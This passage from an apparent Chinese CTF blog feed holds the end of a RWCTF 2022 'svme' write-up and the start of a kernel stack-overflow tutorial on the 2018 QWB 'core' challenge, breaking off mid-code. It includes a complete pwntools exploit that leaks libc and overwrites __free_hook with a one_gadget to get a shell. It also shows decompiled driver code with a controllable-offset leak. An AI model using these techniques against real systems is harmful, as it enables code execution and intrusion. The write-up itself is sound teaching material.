title="step4"></a>step4</h3><p>接下来要做两件事情：</p><ul><li>覆盖*data为free_hook，从而可以写*free_hook（虚拟机内部解引用*data）</li><li>计算one_gardet，覆盖free_hook</li></ul><p>注意到<code>print</code>指令能够单纯使得栈指针减少，通过它我们能够很轻松的实现sp下溢出。结合store就可以在vm结构体中越界覆盖指针。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>首先看到globals地址</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220127222913557.png" alt="image-20220127222913557"></p><p>之后还会创建一个很诡异的，大小为0x400的堆，这个让我迷惑了很久。后来才看见是printf自己创建的。印象里在2021国赛的题目中见到过，似乎还利用了创建堆的性质。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220127223151235.png" alt="image-20220127223151235"></p><p>这里看到经过step1，globals指针地址已经被改掉</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128095331460.png" alt="image-20220128095331460"></p><p>接下来到gload {0x218 / 4 + 1}这里，要找libc_start_main地址。</p><p>在gdb中可以看到存在这样一条地址。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128095752952.png" alt="image-20220128095752952"></p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128095738557.png" alt="image-20220128095738557"></p><p>可以看出来和libc比较接近。只要找到偏移减一下就可以了。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128095928257.png" alt="image-20220128095928257"></p><p>可以看到能够拿到正确的libc</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128100347355.png" alt="image-20220128100347355"></p><p>之后三次print让栈指针减少，我们的目的又是修改globals指针为free_hook，从而写free_hook。</p><p>在没有修改的时候</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128100631983.png" alt="image-20220128100631983"></p><p>经过load 1 和load 0之后（相当于调用栈是我们的一个临时储存栈）数据将被保存在sp指向的位置。可以看到已经成功写入了free_hook地址。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128100845424.png" alt="image-20220128100845424"></p><p>之后其实保险点可以system(“/bin/sh”)因为我们也可以掌握VM中的数据。这里先尝试og了。</p><p>之后栈平衡，我们把free_hook又拿回来到vm栈空间。因为得到的free_hook地址减去free_hook的符号偏移，加上og地址就可以得到最终地址。</p><p>最后两部直接用gsstore，不能用load（思考，为什么？）因为这里要写<code>globals[addr]</code>，也就是修改*globals，即globals指针中的内容。但是load是写<code>vm-&gt;stack[++sp]</code>，也就是修改Globals指针。因此要用两种修改方法。</p><p>至此完成了改写free_hook。使用第二个ong_gardet，成功获取shell</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104118667.png" alt="image-20220128104118667"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./svme&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOOP    = <span class="number">0</span></span><br><span class="line">IADD    = <span class="number">1</span>   </span><br><span class="line">ISUB    = <span class="number">2</span></span><br><span class="line">IMUL    = <span class="number">3</span></span><br><span class="line">ILT     = <span class="number">4</span>   </span><br><span class="line">IEQ     = <span class="number">5</span>   </span><br><span class="line">BR      = <span class="number">6</span>  </span><br><span class="line">BRT     = <span class="number">7</span>  </span><br><span class="line">BRF     = <span class="number">8</span>  </span><br><span class="line">ICONST  = <span class="number">9</span>  </span><br><span class="line">LOAD    = <span class="number">10</span>  </span><br><span class="line">GLOAD   = <span class="number">11</span>  </span><br><span class="line">STORE   = <span class="number">12</span> </span><br><span class="line">GSTORE  = <span class="number">13</span>  </span><br><span class="line">PRINT   = <span class="number">14</span>  </span><br><span class="line">POP     = <span class="number">15</span>  </span><br><span class="line">CALL    = <span class="number">16</span>  </span><br><span class="line">RET     = <span class="number">17</span>  </span><br><span class="line">HALT    = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">og=[<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd=<span class="string">&quot;brva 0x1989&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step1: get host stack info</span></span><br><span class="line"><span class="comment"># 0xfffff7c1 = (-0x2100/4+1) ----&gt; code pointer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4&#125;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code=<span class="string">b&quot;&quot;</span></span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">0xfffff7c1</span>) </span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0x0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">0xfffff7c0</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0x1</span>)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step2 get __libc_start_main, using gdb to find __libc_start_main is 0x218 to *globals</span></span><br><span class="line"><span class="comment"># load it to stack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">135</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 get free_hook, now libc_addr is already on the vm stack, we can using it to calculate free_hook addr</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">iconst &#123;libc.libc_start_main_return&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">iadd&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">159923</span>) <span class="comment"># using gdb</span></span><br><span class="line">code+=p32(ISUB) <span class="comment"># get libc_base and store on VM&#x27;s stack</span></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(IADD) <span class="comment"># libc_base+free_hook store on vm&#x27;s stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># step4: replace free_hook</span></span><br><span class="line"><span class="comment"># first store free_hook to *data, then replace it woth og</span></span><br><span class="line"><span class="comment"># one_gadget_address = __free_hook - libc.symbols[&#x27;__free_hook&#x27;] + one_gadget_offset</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;one_gadget&#125;</span></span><br><span class="line"><span class="string">iadd</span></span><br><span class="line"><span class="string">gstore 0</span></span><br><span class="line"><span class="string">gstore 1</span></span><br><span class="line"><span class="string">halt&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(STORE)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(PRINT)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">1</span>)      <span class="comment"># Replace the `data` ptr</span></span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(LOAD)+p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(ICONST)+p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(ISUB)</span><br><span class="line">code+=p32(ICONST)+p32(og[<span class="number">1</span>])</span><br><span class="line">code+=p32(IADD)</span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">0</span>)    <span class="comment"># Overwrite the `__free_hook`</span></span><br><span class="line">code+=p32(GSTORE)+p32(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># code+=p32(19)               # trigger warning</span></span><br><span class="line">code+=p32(HALT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">code = code.ljust(<span class="number">512</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">io.send(code)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104118667.png" alt="image-20220128104118667"></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>这是难得的可以从源代码角度辅助逆向分析VM的机会。幸好这是一个没有去除符号表的vm(想起来上次逆第五空间没有符号表的vm简直是醉了)</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104445484.png" alt="image-20220128104445484"></p><p>vm_create和vm_init中还是一目了然的</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104545214.png" alt="image-20220128104545214"></p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104600579.png" alt="image-20220128104600579"></p><p>这里比较头疼的地方就是不知道这些指针代表着什么。不过可以通过有名称的函数对其的操作辅助理解。</p><p>关键的exec跳转位置</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128104808492.png" alt="image-20220128104808492"></p><p>由于是switch case，ida无法识别出来，确实。。很难看明白</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220128105202395.png" alt="image-20220128105202395"></p><p>不知道有没有合适的插件，如果没有只能动态调试看看了。还是很复杂的。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-2-stkof</title>
      <link href="/2022/01/24/kernel-2-stkof/"/>
      <url>/2022/01/24/kernel-2-stkof/</url>
      
        <content type="html"><![CDATA[<h1 id="kernel-2-stkof"><a href="#kernel-2-stkof" class="headerlink" title="kernel-2-stkof"></a>kernel-2-stkof</h1><p>这次主要基于内核栈溢出作为主题学习。相关练习是2018强网杯core</p><span id="more"></span><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>拿到一道内核的附件首先要做的一些事情。首先介绍一下题目文件内容</p><p><strong>bzImage</strong>：kernel映像</p><p><strong>core.cpio</strong>：文件系统映像</p><p><strong>start.sh</strong>：一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p><p><strong>vmlinux</strong>：类比成用户态pwn中的libc文件。解压core.cpio之后core目录里也有个vmlinux，调试时用core目录的vmlinux。</p><p>vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。如果题目没有给 vmlinux，可以通过 extract-vmlinux 提取（命令：./extract-vmlinux ./bzImage &gt; vmlinux)。</p><p>我们要做的首先是修改一些配置参数，包括机器内存，自动关机时间等。为了方便我们调试。</p><h3 id="解包文件系统"><a href="#解包文件系统" class="headerlink" title="解包文件系统"></a>解包文件系统</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包文件系统</span></span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio ./core/core.cpio.gz</span><br><span class="line">cd core</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br><span class="line">rm -rf core.cpio</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包文件系统</span></span><br><span class="line">./gen_cpio.sh core.cpio   # gen_cpio.sh在解包的文件系统中自带</span><br><span class="line">mv core.cpio ../core.cpio</span><br><span class="line">cd ..</span><br><span class="line">rm -rf core</span><br></pre></td></tr></table></figure><p>类比于一般的pwn题，在解包的文件系统中，*.ko就是binary文件，vmlinux就是libc文件。</p><h3 id="修改start-sh脚本"><a href="#修改start-sh脚本" class="headerlink" title="修改start.sh脚本"></a>修改start.sh脚本</h3><p>在这里修改分配内存，为了方便调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player git:(main) ✗ cat start.sh   </span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \   =======&gt; change to -m 128M</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \ # 没有开启semp，可以ret2usr，否则只能内核rop</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改文件系统初始化脚本"><a href="#修改文件系统初始化脚本" class="headerlink" title="修改文件系统初始化脚本"></a>修改文件系统初始化脚本</h3><p>打开core，修改其中文件系统初始化脚本init，将时间行注释，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player git:(main) ✗ cd core     </span><br><span class="line">➜  core git:(main) ✗ ls</span><br><span class="line">bin  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">➜  core git:(main) ✗ cat init    </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把kallsyms的内容保存到本地，这样就能从/tmp/kallsyms中获取commit_creds,prepare_kernel_cred等函数的地址了</span></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后在设置这里restrict为1，表示不能通过/proc/kallsyms查看函数地址，但是之前我们已经保存，因此这句话就无关紧要了</span></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dmesg用来储存开机时一些<span class="built_in">log</span>信息，这里把restrict设置为1就表示后续无法读取信息了</span></span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">poweroff -d 120 -f &amp;&lt;======这里注释，类似alarm</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh   # &lt;======这里原来数字是1000，改为0，表示我们可以有内核的调试权限，这样可以方便看到符号表等。</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player git:(main) ✗ qemu-system-x86_64 --<span class="built_in">help</span>|grep gdb </span><br><span class="line">-gdb dev        wait <span class="keyword">for</span> gdb connection on <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::<span class="number">1234</span></span><br></pre></td></tr></table></figure><p>这里说明qemu的远程调试端口可以用-s缩写来代替。-s就是代表-<strong>gdb tcp::1234</strong>。当然，也可以指定其他端口。可以回看我们的启动脚本，发现其中已经包含了-s。我们直接可以远程调试。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="内核保护介绍"><a href="#内核保护介绍" class="headerlink" title="内核保护介绍"></a>内核保护介绍</h3><ul><li>canary、pie、NX和一般的题目类似</li><li><strong>smep</strong>（supervisor mode access prevention）当处于用户态页表的进程想要执行内核代码时，将会报错。同样的，在内核模式下，执行用户空间代码，也会报错。</li></ul><p>本题目保护如下。semp未开启。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/nicholas/Desktop/kernel/pwnkernel/problems/give_to_player/core/core.ko&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><p>拿到一道内核题，首先应该看init_module，它相当于驱动创建的主函数。</p><p>其次，看core_ioctl。这里定义了如何对驱动进行指令级别的管理。也就是之前提到ioctl能够操控的原因。本题的ioctl函数如下。ioctf中包含的函数和之前做os一样。仔细看一下这三个函数做了什么。a3是一个局部变量，core_read可以读入到a3，之后第二个可以把a3赋值给off，最后一个调用了<strong>core_copy</strong>函数。可想而知这是一个比较关键的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD); <span class="comment">// core:%d\n</span></span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3); <span class="comment">// core: called core_copy</span></span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><p>从用户空间读取数据，也就是我们的主函数。在内核中，我们无法直接读取用户输入，要经过syscall等ipc调用。具体流程在操作系统课上将会详细说明。注意这里的copy_to_user是库函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B); <span class="comment">// called core read</span></span><br><span class="line">  printk(&amp;unk_275); <span class="comment">// %d %p (不知道这里是输出了什么？)</span></span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);  <span class="comment">// &lt;==== 从内核空间复制数据到用户空间，注意off是我们可以控制的。</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于off我们可以控制，因此可以通过控制off泄露一些地址和canary。</p><h4 id="core-copy函数"><a href="#core-copy函数" class="headerlink" title="core copy函数"></a>core copy函数</h4><p>比较关键的其实就是在于core_copy函数了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span 